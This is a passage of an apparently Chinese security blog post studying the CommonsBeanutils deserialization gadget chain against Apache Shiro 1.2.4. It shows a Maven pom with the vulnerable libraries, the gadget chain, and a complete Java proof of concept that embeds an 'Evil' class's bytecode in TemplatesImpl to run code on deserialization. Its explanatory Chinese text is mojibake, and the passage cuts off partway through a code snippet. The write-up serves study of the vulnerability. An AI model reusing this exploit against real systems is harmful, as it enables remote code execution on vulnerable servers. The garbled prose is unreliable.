</span></span><span class="line"><span class="cl">  <span class="nt">&lt;properties&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;project.build.sourceEncoding&gt;</span>UTF-8<span class="nt">&lt;/project.build.sourceEncoding&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;maven.compiler.source&gt;</span>1.8<span class="nt">&lt;/maven.compiler.source&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;maven.compiler.target&gt;</span>1.8<span class="nt">&lt;/maven.compiler.target&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/properties&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;dependencies&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.apache.shiro<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>shiro-core<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.2.4<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.javassist<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>javassist<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>3.27.0-GA<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>commons-collections<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>commons-collections<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>3.2.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;groupId&gt;</span>javassist<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>javassist<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>3.12.1.GA<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;scope&gt;</span>compile<span class="nt">&lt;/scope&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.apache.shiro<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>shiro-core<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.2.4<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.apache.shiro<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>shiro-web<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.2.4<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>javax.servlet<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>javax.servlet-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>3.1.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;scope&gt;</span>provided<span class="nt">&lt;/scope&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>javax.servlet.jsp<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>jsp-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>2.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;scope&gt;</span>provided<span class="nt">&lt;/scope&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>commons-collections<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>commons-collections<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>3.2.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>commons-logging<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>commons-logging<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.slf4j<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>slf4j-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.7.30<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.slf4j<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>slf4j-simple<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.7.30<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/dependencies&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;build&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;pluginManagement&gt;</span><span class="c">&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;plugins&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- clean lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#clean_Lifecycle --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-clean-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>3.1.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- default lifecycle, jar packaging: see https://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_jar_packaging --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-resources-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>3.0.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-compiler-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>3.8.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-surefire-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>2.22.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-jar-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>3.0.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-install-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>2.5.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-deploy-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>2.8.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- site lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#site_Lifecycle --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-site-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>3.7.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-project-info-reports-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>3.0.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/plugins&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/pluginManagement&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;plugins&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;groupId&gt;</span>org.apache.maven.plugins<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;artifactId&gt;</span>maven-compiler-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;configuration&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;source&gt;</span>8<span class="nt">&lt;/source&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;target&gt;</span>8<span class="nt">&lt;/target&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/configuration&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/plugins&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/build&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/project&gt;</span>
</span></span></code></pre></div><p>æ¼æ´èµ·æºäº PropertyUtils, å…¶ getProperty æ–¹æ³•èƒ½å¤Ÿè°ƒç”¨ä»»æ„ç±»çš„ getter</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">PropertyUtils</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span><span class="n">person</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;name&#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">// person.getName(); </span><span class="w">
</span></span></span></code></pre></div><p><code>org.apache.commons.beanutils.BeanComparator</code> çš„ compare æ–¹æ³•ä¼šé€šè¿‡ getProperty åˆ†åˆ«è°ƒç”¨ä¸¤ä¸ªå¯¹è±¡çš„ getter</p>
<p><img loading="lazy" src="../images/202212182220665.png" alt="image-20221218222058565"  />
</p>
<p>è¿™é‡Œå°±è”æƒ³åˆ°CC2çš„å¼€å¤´ï¼ŒCC2å¼€å¤´é‚£ä¸ªç±»æ˜¯jdkåŸç”Ÿçš„æ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨ï¼Œé“¾å­å°±å®Œæ•´äº†ï¼Œè°ƒè¯•ä¹Ÿå¾ˆç®€å•ï¼Œè‡ªå·±æ”¹æ”¹å°±å¥½äº†</p>
<h3 id="åˆ©ç”¨é“¾"><strong>åˆ©ç”¨é“¾</strong><a hidden class="anchor" aria-hidden="true" href="#åˆ©ç”¨é“¾">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">Gadget chain:
</span></span><span class="line"><span class="cl">     PriorityQueue.readObject()
</span></span><span class="line"><span class="cl">     PriorityQueue.heapify()
</span></span><span class="line"><span class="cl">     PriorityQueue.siftDown()
</span></span><span class="line"><span class="cl">     PriorityQueue.siftDownUsingComparator()
</span></span><span class="line"><span class="cl">               BeanComparator.compare()
</span></span><span class="line"><span class="cl">                  PropertyUtils.getProperty()
</span></span><span class="line"><span class="cl">                     TemplatesImpl.getoutputProperties()
</span></span></code></pre></div><h3 id="poc"><strong>poc</strong><a hidden class="anchor" aria-hidden="true" href="#poc">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.govuln.shiroattack</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.beanutils.BeanComparator</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.PriorityQueue</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">mycode</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFieldValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">fieldName</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">fieldName</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">govuln</span><span class="p">.</span><span class="na">shiroattack</span><span class="p">.</span><span class="na">Evil</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytecode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">bytecode</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;HelloTemplatesImpl&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_tfactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//BeanComparator beanComparator = new BeanComparator(&#34;outputProperties&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BeanComparator</span><span class="w"> </span><span class="n">beanComparator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BeanComparator</span><span class="p">(</span><span class="s">&#34;outputProperties&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">priorityQueue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">(</span><span class="n">2</span><span class="p">,</span><span class="n">beanComparator</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">priorityQueue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        priorityQueue.add(1);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">priorityQueue</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;size&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">size</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">size</span><span class="p">.</span><span class="na">setInt</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>é“¾å­å¾ˆç®€å•æ²¡å•¥åˆ†æï¼Œä½†æ˜¯<code>PropertyUtils.getProperty()</code>é‡Œé¢æœ‰å¾ˆå¤šæ­¥éª¤ï¼Œè¿™é‡Œä¸»è¦åˆ†æä¸‹<code>getPropertyDescriptors()</code>è¿™ä¸ªä¸œè¥¿</p>
<h3 id="gettargetpropertyinfo">getTargetPropertyInfo()<a hidden class="anchor" aria-hidden="true" href="#gettargetpropertyinfo">#</a></h3>
<p><code>PropertyUtils.getProperty()</code>ä¸­ä¼šä¸€ç›´åˆ°<code>getSimpleProperty()</code>è¿™é‡Œ</p>
<ol>
<li>ç¬¬ä¸€æ­¥æ ¹æ®beanå’Œnameè·å–descriptor</li>
<li>è·å–descriptorå¯¹åº”çš„Method</li>
<li>invokeæ‰§è¡Œè¿™ä¸ªMethod</li>
</ol>
<p><img loading="lazy" src="../images/image-20241128191445061.png" alt="image-20241128191445061"  />
</p>
<p>æœ€ä¸»è¦çš„ä¸€æ­¥å°±æ˜¯<code>getPropertyDescriptor()</code>,æˆ‘ä»¬è·Ÿè¿›å»ï¼Œä¸»è¦å°±ä¸‹é¢çš„ä»£ç </p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">PropertyDescriptor</span><span class="o">[]</span><span class="w"> </span><span class="n">descriptors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getPropertyDescriptors</span><span class="p">(</span><span class="n">bean</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">descriptors</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">descriptors</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
